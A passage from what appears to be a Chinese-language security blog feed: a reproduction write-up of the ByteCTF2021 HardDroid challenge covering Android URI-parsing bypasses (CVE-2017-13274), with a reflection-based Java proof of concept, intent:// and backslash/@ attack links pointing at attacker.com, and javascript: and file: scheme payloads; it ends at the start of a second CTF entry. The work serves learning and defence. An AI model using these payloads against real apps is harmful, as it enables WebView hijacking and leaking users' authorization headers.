Uri.parse(url).getHost());          <span class="comment">// 输出 legitimate.com!</span></span><br><span class="line">webView.loadUrl(url, getAuthorizationHeaders()); <span class="comment">// 加载 attacker.com！</span></span><br></pre></td></tr></table></figure><p>看来<code>android.net.Uri</code>的 parse() 是有安全缺陷的，我们扒拉一下代码定位问题…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[frameworks/base/core/java/android/net/Uri.java]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Uri <span class="title function_">parse</span><span class="params">(String uriString)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringUri</span>(uriString);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续看这个内部类<code>StringUri</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">[frameworks/base/core/java/android/net/Uri.java]</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">StringUri</span> <span class="keyword">extends</span> <span class="title class_">AbstractHierarchicalUri</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">private</span> <span class="title function_">StringUri</span><span class="params">(String uriString)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.uriString = uriString;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">private</span> Part <span class="title function_">getAuthorityPart</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (authority == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">encodedAuthority</span></span><br><span class="line">                        <span class="operator">=</span> parseAuthority(<span class="built_in">this</span>.uriString, findSchemeSeparator());</span><br><span class="line">                <span class="type">return</span> <span class="variable">authority</span> <span class="operator">=</span> Part.fromEncoded(encodedAuthority);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> authority;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">static</span> String <span class="title function_">parseAuthority</span><span class="params">(String uriString, <span class="type">int</span> ssi)</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> uriString.length();</span><br><span class="line">            <span class="comment">// If &quot;//&quot; follows the scheme separator, we have an authority.</span></span><br><span class="line">            <span class="keyword">if</span> (length &gt; ssi + <span class="number">2</span></span><br><span class="line">                    &amp;&amp; uriString.charAt(ssi + <span class="number">1</span>) == <span class="string">&#x27;/&#x27;</span></span><br><span class="line">                    &amp;&amp; uriString.charAt(ssi + <span class="number">2</span>) == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">                <span class="comment">// We have an authority.</span></span><br><span class="line">                <span class="comment">// Look for the start of the path, query, or fragment, or the</span></span><br><span class="line">                <span class="comment">// end of the string.</span></span><br><span class="line">                <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> ssi + <span class="number">3</span>;</span><br><span class="line">                LOOP: <span class="keyword">while</span> (end &lt; length) &#123;</span><br><span class="line">                    <span class="keyword">switch</span> (uriString.charAt(end)) &#123;</span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: <span class="comment">// Start of path</span></span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>: <span class="comment">// Start of query</span></span><br><span class="line">                        <span class="keyword">case</span> <span class="string">&#x27;#&#x27;</span>: <span class="comment">// Start of fragment</span></span><br><span class="line">                            <span class="keyword">break</span> LOOP;</span><br><span class="line">                    &#125;</span><br><span class="line">                    end++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> uriString.substring(ssi + <span class="number">3</span>, end);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就明显看到<code>StringUri</code>没有对authority部分做反斜杠的识别处理, 接着找<code>StringUri</code>的父类<code>AbstractHierarchicalUri</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[frameworks/base/core/java/android/net/Uri.java]</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">abstract</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AbstractHierarchicalUri</span> <span class="keyword">extends</span> <span class="title class_">Uri</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">parseUserInfo</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">authority</span> <span class="operator">=</span> getEncodedAuthority();</span><br><span class="line">        <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> authority.indexOf(<span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> end == NOT_FOUND ? <span class="literal">null</span> : authority.substring(<span class="number">0</span>, end);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">parseHost</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">authority</span> <span class="operator">=</span> getEncodedAuthority();</span><br><span class="line">        <span class="comment">// Parse out user info and then port.</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">userInfoSeparator</span> <span class="operator">=</span> authority.indexOf(<span class="string">&#x27;@&#x27;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">portSeparator</span> <span class="operator">=</span> authority.indexOf(<span class="string">&#x27;:&#x27;</span>, userInfoSeparator);</span><br><span class="line">        <span class="type">String</span> <span class="variable">encodedHost</span> <span class="operator">=</span> portSeparator == NOT_FOUND</span><br><span class="line">                ? authority.substring(userInfoSeparator + <span class="number">1</span>)</span><br><span class="line">                : authority.substring(userInfoSeparator + <span class="number">1</span>, portSeparator);</span><br><span class="line">        <span class="keyword">return</span> decode(encodedHost);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>就在这里把@符号之前内容的作为 UserInfo 给切断了，host 内容从@符号之后算起。（这里其实存在另一个 bug，没有考虑多个@的情况）</p></blockquote><p>Google 在 2018年4月的 Android 安全公告里发布了这个漏洞<a href="https://source.android.com/security/bulletin/2018-04-01#android-runtime">CVE-2017-13274</a>的<a href="https://android.googlesource.com/platform/frameworks/base/+/0b57631939f5824afef06517df723d2e766e0159%5E!/">补丁</a></p><p>通过AndroidXRef查询，这个补丁在 Oreo - 8.1.0_r33 才加入到原生源码中。所以安全补丁日期早于2018-04-01的系统都受影响，而 Google 一般通过协议要求 OEM厂商保证产品上市之后两年内按期打安全补丁。那么经过推算得出 Android 6及以下的系统都受影响。</p><p>PS：url含多个@的情况也在2018年1月的补丁中进行了修复CVE-2017-13176</p><p><strong><code>userinfo</code> 是 URL 里用于“身份认证信息”的一部分，格式是：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme://userinfo@host:port/path</span><br></pre></td></tr></table></figure><p>也就是说：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://username:password@www.example.com/</span><br></pre></td></tr></table></figure><ul><li><code>username:password</code> → <strong>userinfo</strong></li><li><code>@</code> 后面才是真正的 <code>host</code></li></ul><p><strong>userinfo 在现代浏览器中几乎被废弃&#x2F;忽略，但在 URI 解析标准里仍然是合法结构</strong>。</p><h3 id="二、反射调用HierarchicalUri构造Uri"><a href="#二、反射调用HierarchicalUri构造Uri" class="headerlink" title="二、反射调用HierarchicalUri构造Uri"></a>二、反射调用HierarchicalUri构造Uri</h3><p>上一节提到了@的截取的特性，会把恶意地址前缀<code>attacker.com</code>存入 UserInfo，那么现在改进校验方法, 加上 UserInfo 的检查是不是就万无一失了呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[check_v2]</span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isOurDomain</span> <span class="operator">=</span> <span class="string">&quot;https&quot;</span>.equals(uri.getScheme()) &amp;&amp; uri.getUserInfo() == <span class="literal">null</span> &amp;&amp; <span class="string">&quot;legitimate.com&quot;</span>.equals(uri.getHost());</span><br><span class="line"><span class="keyword">if</span> (isOurDomain) &#123;</span><br><span class="line">    webView.load(uri.toString(), getAuthorizationHeaders());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还是看<code>android.net.Uri</code>源码，发现除了StringUri，还有一个内部类HierarchicalUri 也继承了 AbstractHierarchicalUri</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[frameworks/base/core/java/android/net/Uri.java]</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">HierarchicalUri</span> <span class="keyword">extends</span> <span class="title class_">AbstractHierarchicalUri</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String scheme; <span class="comment">// can be null</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Part authority;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> PathPart path;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Part query;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Part fragment;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">HierarchicalUri</span><span class="params">(String scheme, Part authority, PathPart path, Part query, Part fragment)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.scheme = scheme;</span><br><span class="line">        <span class="built_in">this</span>.authority = Part.nonNull(authority);</span><br><span class="line">        <span class="built_in">this</span>.path = path == <span class="literal">null</span> ? PathPart.NULL : path;</span><br><span class="line">        <span class="built_in">this</span>.query = Part.nonNull(query);</span><br><span class="line">        <span class="built_in">this</span>.fragment = Part.nonNull(fragment);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而AbstractHierarchicalUri又是继承自Uri，所以很容易想到，通过反射调用HierarchicalUri这个私有构造函数，传入构造好的 authority 和 path, 创建一个任意可控的Uri实例。继续查看Part和PathPart类的构造方法：</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">static <span class="class"><span class="keyword">class</span> <span class="title">Part</span> <span class="keyword">extends</span> <span class="title">AbstractPart</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">Part</span>(<span class="type">String</span> encoded, <span class="type">String</span> decoded) &#123;</span><br><span class="line">        <span class="keyword">super</span>(encoded, decoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">static <span class="class"><span class="keyword">class</span> <span class="title">PathPart</span> <span class="keyword">extends</span> <span class="title">AbstractPart</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">PathPart</span>(<span class="type">String</span> encoded, <span class="type">String</span> decoded) &#123;</span><br><span class="line">        <span class="keyword">super</span>(encoded, decoded);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>Part</code> 本质是一个小容器，里面同时存两份东西：</p><ul><li><code>encoded</code>（编码形式）</li><li><code>decoded</code>（解码形式）</li></ul></blockquote><p>由此构造 PoC 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">PoC</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;PoC&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">attackerUri</span> <span class="operator">=</span> <span class="string">&quot;@attacker.com&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">legitimateUri</span> <span class="operator">=</span> <span class="string">&quot;legitimate.com&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">partClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$Part&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">partConstructor</span> <span class="operator">=</span> partClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        partConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">pathPartClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$PathPart&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">pathPartConstructor</span> <span class="operator">=</span> pathPartClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        pathPartConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">hierarchicalUriClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;android.net.Uri$HierarchicalUri&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">hierarchicalUriConstructor</span> <span class="operator">=</span> hierarchicalUriClass.getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        hierarchicalUriConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(legitimateUri, legitimateUri);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(attackerUri, attackerUri);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Scheme: &quot;</span> + uri.getScheme());</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;UserInfo: &quot;</span> + uri.getUserInfo());</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Host: &quot;</span> + uri.getHost());</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;toString(): &quot;</span> + uri.toString());</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">    intent.setClassName(Victim_packageName, Victim_className);</span><br><span class="line">    intent.setData(uri);</span><br><span class="line">    intent.addFlags(<span class="number">268435456</span>);</span><br><span class="line">    startActivity(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>logcat 输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">07-07 19:00:36.765 9209 9209 D PoC : Scheme: https</span><br><span class="line">07-07 19:00:36.765 9209 9209 D PoC : UserInfo: null</span><br><span class="line">07-07 19:00:36.765 9209 9209 D PoC : Host: legitimate.com</span><br><span class="line">07-07 19:00:36.765 9209 9209 D PoC : toString(): https://legitimate.com@attacker.com</span><br></pre></td></tr></table></figure><p>从输出日志可以看到，通过此反射方法构造的 Uri 对象，可以通过 check_v2 方法对 <code>Scheme</code>、 <code>UserInfo</code> 和 <code>Host</code> 的三项检验，但 toString() 方法的值<code>https://legitimate.com@attacker.com</code>，才是被攻击的 Activity 拉起的实际地址。如前所述，@符号之后的 <code>attacker.com</code> 便成为了最终访问的 host。</p><p>PoC 关键两行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">authority</span> <span class="operator">=</span> partConstructor.newInstance(legitimateUri, legitimateUri);</span><br><span class="line"><span class="type">Object</span> <span class="variable">path</span> <span class="operator">=</span> pathPartConstructor.newInstance(attackerUri, attackerUri); <span class="comment">// attackerUri = &quot;@attacker.com&quot;</span></span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> (Uri) hierarchicalUriConstructor.newInstance(<span class="string">&quot;https&quot;</span>, authority, path, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>意思是：</p><ul><li><strong>authority 字段</strong>（也就是 <code>//</code> 后面那块）设为 <code>&quot;legitimate.com&quot;</code></li><li><strong>path 字段</strong>（也就是 <code>/path</code> 那块）设为 <code>&quot;@attacker.com&quot;</code> —— 注意它没写 <code>/@attacker.com</code>，而是直接 <code>@attacker.com</code></li></ul><p>然后 <code>HierarchicalUri.toString()</code> 拼 URL 时会做：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scheme + &quot;://&quot; + authority + path</span><br></pre></td></tr></table></figure><p>于是得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;https://legitimate.com&quot; + &quot;@attacker.com&quot; = &quot;https://legitimate.com@attacker.com&quot;</span><br></pre></td></tr></table></figure><p>抵御这种攻击的方法也非常简单，对传入的 <code>Uri</code> 对象加一次 parse() 再做 check_v2 即可:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span> <span class="variable">raw</span> <span class="operator">=</span> getIntent().getData();</span><br><span class="line"><span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.parse(raw.toString());</span><br><span class="line">uri.getUserInfo()  -&gt; <span class="string">&quot;legitimate.com&quot;</span></span><br><span class="line">uri.getHost()      -&gt; <span class="string">&quot;attacker.com&quot;</span></span><br></pre></td></tr></table></figure><h3 id="三、远程利用方法"><a href="#三、远程利用方法" class="headerlink" title="三、远程利用方法"></a>三、远程利用方法</h3><p>我们知道，通过在组件中注册 <code>intent-filter</code>，App 可以响应浏览器应用或短信应用访问的外链。典型的一个配置写法如下，只有 <code>&lt;data&gt;</code> 标签中指定的内容和 Intent 中携带的 Data 完全一致时，当前活动才能响应该 Intent。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;.DeeplinkActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:autoVerify</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.VIEW&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">data</span> <span class="attr">android:scheme</span>=<span class="string">&quot;https&quot;</span> <span class="attr">android:host</span>=<span class="string">&quot;legitimate.com&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>前面两种方法我们都是用安装恶意 App 或 ADB 命令来触发攻击，注意到 Android 对 <code>&lt;data&gt;</code> 定义的属性，也是通过 <code>parsedIntent.getData().getHost()</code> 来进行匹配的，我们很自然的想到尝试远程利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">&lt;a href=<span class="string">&quot;[scheme]://[host]/[path]?[query]&quot;</span>&gt;调用格式&lt;/a&gt; </span><br><span class="line">--&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;https://attacker.com\\@legitimate.com/&quot;</span>&gt;Click Attack v1&lt;/a&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;https://attacker.com%5C%5C@legitimate.com/&quot;</span>&gt;Click Attack v2&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>然而，对于第一个链接，浏览器会自动把反斜杠 “&quot; 纠正为正斜杠 “&#x2F;“</p><p>对于第二个链接，反斜杠 “&quot; 会以 URL 编码形式保留而无法触发方法1 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host = attacker.com%5C%5C@legitimate.com</span><br></pre></td></tr></table></figure><p>通过仔细研究<code>intent://scheme</code>的<a href="http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/content/Intent.java#6021">工作机制</a>，发现可以通过如下方式保留反斜杠 <code>&quot;\&quot;</code> 的方法：</p><p>PoC:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;intent://not_used/#Intent;scheme=https://attacker.com\\@legitimate.com/;end&quot;&gt;Click Attack v3&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>跟踪<a href="http://androidxref.com/8.1.0_r33/xref/frameworks/base/core/java/android/content/Intent.java#6123">源码</a>，可以看到，访问这个链接，等价于执行：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Uri</span>.parse(<span class="string">&quot;https://attacker.com<span class="subst">\\</span><span class="subst">\\</span>@legitimate.com/://not_used/&quot;</span>)</span><br></pre></td></tr></table></figure><p>从而实现方法1的远程执行版本。</p><h3 id="四、缺少scheme验证"><a href="#四、缺少scheme验证" class="headerlink" title="四、缺少scheme验证"></a>四、缺少scheme验证</h3><p>实战不乏有些 App 对 host 做了校验，但却遗漏了对 scheme 的检查。</p><p>可以用下面的 uri， 尝试进行 js 和 file 域的 PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javascript:<span class="comment">//legitimate.com/%0aalert(1)//</span></span><br><span class="line">file:<span class="comment">//legitimate.com/sdcard/payload.html</span></span><br></pre></td></tr></table></figure><p>javascript:&#x2F;&#x2F;legitimate.com&#x2F;%0aalert(1)&#x2F;&#x2F;</p><p>App 的校验视角</p><p>uri.getHost() -&gt; “legitimate.com”  </p><p>通过校验。</p><p>WebView 的执行视角,javascript:&#x2F;&#x2F; 是 WebView 支持的 scheme，语义是把后面的内容当作 JS 代码执行而 %0a 是 URL 编码的 换行符（\n）所以 WebView 实际执行的是：</p><p>alert(1)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-HardDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-HardDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 HardDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021 HardD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2021 ByteDroid1复现</title>
    <link href="http://matriy330.github.io/d5a3f640/"/>
    <id>http://matriy330.github.io/d5a3f640/</id>
    <published>2026-01-23T13:13:29.000Z</published>
    <updated>2026-01-23T13:13:28.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2021-ByteDroid1复现"><a href="#ByteCTF2021-ByteDroid1复现" class="headerlink" title="ByteCTF2021 ByteDroid1复现"></a>ByteCTF2021 ByteDroid1复现</h1><p>依旧参考：<a href="https://blog.lleavesg.top/article/ByteCTF-2021-ByteDroid1#daff8df324204985a9667aef638409bf">ByteCTF2021 ByteDroid1复现 | LLeaves Blog</a></p><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;30&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;11&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytectf.bytedroid1&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;30&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;11&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;21&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;30&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span 